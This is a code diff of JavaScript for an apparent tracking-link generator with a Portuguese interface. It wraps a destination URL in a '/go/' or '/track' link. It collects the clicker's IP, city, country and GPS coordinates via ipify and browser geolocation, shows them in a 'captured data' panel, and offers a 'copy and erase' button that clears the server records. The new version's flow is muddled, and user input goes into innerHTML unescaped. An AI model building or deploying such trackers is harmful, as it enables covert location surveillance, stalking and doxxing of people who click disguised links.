@@ -1,62 +1,52 @@
-function generateLink() {
-  const input = document.getElementById("url");
-  const url = input.value.trim();
-  if (!url) return alert("Cole um link válido.");
+function generate() {
+  const dest = document.getElementById('dest').value.trim();
+  if (!dest) return alert('Cole um link válido');
 
-  const encoded = encodeURIComponent(url);
-  const finalLink = `${location.origin}/go/${btoa(encoded)}`;
+  const encoded = encodeURIComponent(dest);
+  const url = `/track?dest=${encoded}`;
 
-  const div = document.getElementById("result");
-  div.innerHTML = `
-    <p>Link gerado:</p>
-    <input type="text" id="finalLink" value="${finalLink}" readonly />
-    <button onclick="copyAndClear()">Copiar e apagar</button>
+  document.getElementById('link').innerHTML = `
+    <p><a href="${url}" style="color:lime;" target="_blank">${url}</a></p>
   `;
-  div.style.display = "block";
 
-  fetchData(); // Atualiza painel abaixo
-}
-
-function copyAndClear() {
-  const input = document.getElementById("finalLink");
-  input.select();
-  document.execCommand("copy");
-
-  // Apaga dados do servidor
-  fetch("/clear", { method: "POST" });
-
-  document.getElementById("result").style.display = "none";
-  document.getElementById("result").innerHTML = "";
-  document.getElementById("url").value = "";
-  document.getElementById("dataTable").style.display = "none";
-}
-
-function fetchData() {
-  fetch("/data")
+  // Get IP
+  fetch('https://api.ipify.org?format=json')
     .then(res => res.json())
-    .then(entries => {
-      if (!entries.length) return;
+    .then(data => {
+      const ip = data.ip;
 
-      const table = `
-        <h2>Dados capturados:</h2>
-        <table>
-          <tr><th>IP</th><th>Cidade</th><th>País</th><th>Latitude</th><th>Longitude</th><th>Hora</th></tr>
-          ${entries.map(e => `
-            <tr>
-              <td>${e.ip || "-"}</td>
-              <td>${e.city || "-"}</td>
-              <td>${e.country || "-"}</td>
-              <td>${e.latitude || "-"}</td>
-              <td>${e.longitude || "-"}</td>
-              <td>${new Date(e.timestamp).toLocaleString()}</td>
-            </tr>
-          `).join("")}
-        </table>
-      `;
-      const div = document.getElementById("dataTable");
-      div.innerHTML = table;
-      div.style.display = "block";
+      // Get location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          fetch('/save', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              ip,
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            })
+          });
+        });
+      }
+
+      // Show on panel
+      setTimeout(() => {
+        const panel = document.getElementById('panel');
+        panel.innerHTML = `
+          <h3>Dados Capturados:</h3>
+          <pre id="dados">${JSON.stringify({ ip }, null, 2)}</pre>
+          <button class="copy-btn" onclick="copyAndClear()">Copiar e Apagar</button>
+        `;
+      }, 1000);
     });
 }
 
-window.onload = fetchData;
+function copyAndClear() {
+  const text = document.getElementById('dados').innerText;
+  navigator.clipboard.writeText(text).then(() => {
+    document.getElementById('panel').innerHTML = '';
+    document.getElementById('link').innerHTML = '';
+    document.getElementById('dest').value = '';
+  });
+}
